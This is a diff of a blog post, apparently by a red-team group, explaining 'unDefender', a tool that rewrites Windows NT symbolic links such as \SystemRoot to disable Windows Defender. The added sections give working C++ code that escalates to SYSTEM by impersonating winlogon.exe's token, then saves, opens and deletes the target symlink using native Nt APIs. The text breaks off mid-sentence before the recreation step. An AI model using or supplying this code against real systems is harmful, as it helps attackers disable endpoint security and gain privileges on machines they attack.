@@ -26,10 +26,79 @@ As you can see it's not the one we showed in the table above, as \SystemRoot is 
 
 ![symlink acl]({{site.baseurl}}/img/symlinkacl.PNG)
 
-As you can see, SYSTEM (and Administrators) don't have READ/WRITE privilege on the NT symbolic link \SystemRoot (although we can query it and see where it points to), but they have the DELETE privilege. Factor in the fact SYSTEM can create new NT symbolic links and you get yourself the ability to actually change the NT symbolic link: just delete it and recreate it pointing it to something you control. The same applies for other NT symbolic links, \Device\BootDevice included. To actually rewrite this kind of symbolic link we need to use native APIs as there are no Win32 APIs for that. I'll walk you through some code snippets from our project [unDefender](https://github.com/APTortellini/unDefender) which abuses this behaviour. Here's a flowchart of how the different pieces of the software work:
+As you can see, SYSTEM (and Administrators) don't have READ/WRITE privilege on the NT symbolic link \SystemRoot (although we can query it and see where it points to), but they have the DELETE privilege. Factor in the fact SYSTEM can create new NT symbolic links and you get yourself the ability to actually change the NT symbolic link: just delete it and recreate it pointing it to something you control. The same applies for other NT symbolic links, \Device\BootDevice included. To actually rewrite this kind of symbolic link we need to use native APIs as there are no Win32 APIs for that.
+### The code
+I'll walk you through some code snippets from our project [unDefender](https://github.com/APTortellini/unDefender) which abuses this behaviour. Here's a flowchart of how the different pieces of the software work:
 
 ![unDefender flowchart]({{site.baseurl}}/img/undefenderFlowchart.PNG)
 
+All the functions used in the program are defined in the common.h header. Here you will also find definitions of the Nt functions I had to dynamically load from ntdll. Note that I wrap the HANDLE, HMODULE and SC\_HANDLE types in custom types part of the RAII namespace as I heavily rely on C++'s [RAII paradigm](https://en.wikipedia.org/wiki/Resource_acquisition_is_initialization) in order to safely handle these types. These custom RAII types are defined in the raii.h header and implemented in their respective .cpp files.
+#### Getting SYSTEM
+First things first, we elevate our token to a SYSTEM one. This is easily done through the GetSystem function, implemented in the GetSystem.cpp file. Here we basically open winlogon.exe, a SYSTEM process running unprotected in every Windows session,  using the OpenProcess API. After that we open its token, through OpenProcessToken, and impersonate it using ImpersonateLoggedOnUser, easy peasy. 
+
+```C++
+#include "common.h"
+
+bool GetSystem()
+{
+	RAII::Handle winlogonHandle = OpenProcess(PROCESS_ALL_ACCESS, false, FindPID(L"winlogon.exe"));
+	if (!winlogonHandle.GetHandle())
+	{
+		std::cout << "[-] Couldn't get a PROCESS_ALL_ACCESS handle to winlogon.exe, exiting...\n";
+		return false;
+	}
+	else std::cout << "[+] Got a PROCESS_ALL_ACCESS handle to winlogon.exe!\n";
+
+	HANDLE tempHandle;
+	auto success = OpenProcessToken(winlogonHandle.GetHandle(), TOKEN_QUERY | TOKEN_DUPLICATE, &tempHandle);
+	if (!success)
+	{
+		std::cout << "[-] Couldn't get a handle to winlogon.exe's token, exiting...\n";
+		return success;
+	}
+	else std::cout << "[+] Opened a handle to winlogon.exe's token!\n";
+	RAII::Handle tokenHandle = tempHandle;
+	
+	success = ImpersonateLoggedOnUser(tokenHandle.GetHandle());
+	if (!success)
+	{
+		std::cout << "[-] Couldn't impersonate winlogon.exe's token, exiting...\n";
+		return success;
+	}
+	else std::cout << "[+] Successfully impersonated winlogon.exe's token, we are SYSTEM now ;)\n";
+	return success;
+}
+```
+#### Saving the symbolic link current state
+After getting SYSTEM we need to backup the current state of the symbolic link, so that we can programmatically restore it later. This is done through the GetSymbolicLinkTarget implemented in the GetSymbolicLinkTarget.cpp file. After resolving the address of the Nt functions (skipped in the following snippet) we initialize two key data structures: a UNICODE\_STRING and a OBJECT\_ATTRIBUTES
+```C++
+UNICODE_STRING symlinkPath;
+RtlInitUnicodeString(&symlinkPath, symLinkName.c_str());
+OBJECT_ATTRIBUTES symlinkObjAttr{};
+InitializeObjectAttributes(&symlinkObjAttr, &symlinkPath, OBJ_KERNEL_HANDLE, NULL, NULL);
+HANDLE tempSymLinkHandle;
+
+NTSTATUS status = NtOpenSymbolicLinkObject(&tempSymLinkHandle, GENERIC_READ, &symlinkObjAttr);
+RAII::Handle symLinkHandle = tempSymLinkHandle;
+
+UNICODE_STRING LinkTarget{};
+wchar_t buffer[MAX_PATH] = { L'\0' };
+LinkTarget.Buffer = buffer;
+LinkTarget.Length = 0;
+LinkTarget.MaximumLength = MAX_PATH;
+
+status = NtQuerySymbolicLinkObject(symLinkHandle.GetHandle(), &LinkTarget, nullptr);
+if (!NT_SUCCESS(status))
+{
+    Error(RtlNtStatusToDosError(status));
+    std::wcout << L"[-] Couldn't get the target of the symbolic link " << symLinkName << std::endl;
+    return L"";
+}
+else std::wcout << "[+] Symbolic link target is: " << LinkTarget.Buffer << std::endl;
+return LinkTarget.Buffer;
+```
+
+#### Changing the symbolic link
 First, we setup some data structures that will identify the symlink we want to target and then call the native function NtOpenSymbolicLink to get a handle to said symlink with DELETE privileges.
 
 ```C++
@@ -48,3 +117,5 @@ After that, we proceed to delete the symlink. To do that we first have to call N
 status = NtMakeTemporaryObject(symlinkHandle);
 CloseHandle(symlinkHandle);
 ```
+
+Once we have deleted the symlink it's time to recreate it and make it point
